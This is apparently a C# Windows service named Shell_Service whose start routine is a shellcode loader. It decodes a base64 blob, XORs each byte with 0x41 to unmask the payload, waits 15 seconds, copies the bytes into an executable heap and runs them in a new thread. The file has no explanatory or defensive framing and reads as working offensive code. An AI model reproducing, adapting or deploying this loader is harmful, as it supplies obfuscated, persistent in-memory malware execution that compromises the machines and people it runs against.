using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Shell_Service
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            string buf = "vQnCpbGpjUFBQQAQABETEBcJcJMkCcoTIQnKE1kJyhNhCcozEQlO9gsLDHCICXCB7X0gPUNtYQCAiEwAQICjrBMJyhNhABDKA30JQJEnwDlZSkNOxDNBQUHKwclBQUEJxIE1JglAkcoJWREFygFhCECRohcJvogAynXJCUCXDHCICXCBAICITO0AQIB5oTSwDUINZUkEeJA0mRkFygFlCECRJwDKTQkFygFdCECRAMpFyQAZABkfCUCRGBsAGQAYABsJwq1hABO+oRkAGBsJylOoCr6+vhwI/zYycx5yc0FBABcIyKcJwK3hQEFBCMikCP1DQUERS8A5aAAVCMilDciwAPsNNmdGvpQNyKspQEBBQRgA+2jBKkG+lCtLAB8REQxwiAxwgQm+gQnIgwm+gQnIgAD7q06eob6UCciGK1EAGQ3IownIuAD72OQ1IL6UxIE1Swi+jzSkqdJBQUEJwq1RCcijDHCIK0UAGQnIuAD7Q5iJHr6UwrlBPxQJwoVhH8i3KwEAGClBUUFBABkJyLMJcIgA+xnlEqS+lAnIggjIhgxwiAjIsQnImwnIuAD7Q5iJHr6UwrlBPGkZABYYKUEBQUEAGStBGwD7Sm5Ocb6UFhgA+zQvDCC+lAi+j6h9vr6+CUCCCWiHCcS3NPUAvqYZK0EYCIaDsfTjF76U";
            byte[] test = Convert.FromBase64String(buf);
            Console.WriteLine(test.Length);

            System.Threading.Thread.Sleep(15000);
            UIntPtr scSize = (UIntPtr)test.Length;

            
            UIntPtr initSize = UIntPtr.Zero;
            UIntPtr maxSize = UIntPtr.Zero;
            uint HEAP_CREATE_ENABLE_EXECUTE = (uint)HeapCreationFlags.CREATE_ENABLE_EXECUTE;

             
            uint HEAP_ZERO_MEMORY = (uint)HeapAllocationFlags.ZERO_MEMORY;

            
            const UInt32 INFINITE = 0xFFFFFFFF;

            //Zoro is below.... Z
            for (int i = 0; i < test.Length; i++)
            {
                test[i] = (byte)((uint)test[i] ^ 0x41);
            }

            
            IntPtr hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, initSize, maxSize);
            
            IntPtr hAlloc = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, scSize);
            
            Marshal.Copy(test, 0, hAlloc, (int)scSize);
            
            IntPtr cThread = CreateThread(IntPtr.Zero, 0, hAlloc, IntPtr.Zero, 0, IntPtr.Zero);
            
            WaitForSingleObject(cThread, INFINITE); // Doesn't have to be infinite... 5s maybe ?
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);

        [DllImport("kernel32.dll", SetLastError = false)]
        static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, UIntPtr dwBytes);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [Flags]
        enum HeapCreationFlags : uint
        {
            CREATE_ENABLE_EXECUTE = 0x00040000,
            GENERATE_EXCEPTIONS = 0x00000004,
            NO_SERIALIZE = 0x00000001
        }
        [Flags]
        enum HeapAllocationFlags : uint
        {
            GENERATE_EXCEPTIONS = 0x00000004,
            NO_SERIALIZE = 0x00000001,
            ZERO_MEMORY = 0x00000008

        }

        protected override void OnStop()
        {
            return;
        }
    }
}
